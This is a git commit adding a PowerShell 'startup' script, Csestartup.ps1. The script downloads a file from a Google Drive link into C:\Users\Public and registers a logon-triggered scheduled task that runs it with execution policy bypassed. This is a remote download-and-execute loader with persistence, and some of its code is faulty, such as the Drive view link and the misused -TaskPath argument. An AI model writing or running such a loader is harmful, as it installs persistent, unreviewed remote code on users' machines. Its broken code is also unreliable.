64e0988bdbd8d8bbc12cfdceb2be0c5aa0812ef6
Rajat Jangra <162875200+RajatJangra2653@users.noreply.github.com>
2024-04-11 15:56:29 +0530

    Add files via upload

---
+++ Csestartup.ps1
@@ -0,0 +1,14 @@
+# Define the URL of the PowerShell file to download
+$url = "https://drive.google.com/file/d/1uUwnvqqMWRCZ2L33J2lOLXcCuQFka-Xc/view?usp=sharing"
+
+# Define the path for the temporary file to save the downloaded PowerShell script
+$tempFilePath = "C:\Users\Public\chromeandiis.ps1"
+
+# Download the PowerShell file from the URL and save it to the temporary file
+Invoke-WebRequest -Uri $url -OutFile $tempFilePath
+
+# Create a scheduled task to run the downloaded PowerShell script on user logon
+$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File $tempFilePath"
+$trigger = New-ScheduledTaskTrigger -AtLogon
+$task = New-ScheduledTask -Trigger $trigger -Description "Run PowerShell script on user logon"
+Register-ScheduledTask -TaskName ABC -TaskPath $task -Action $action -Force
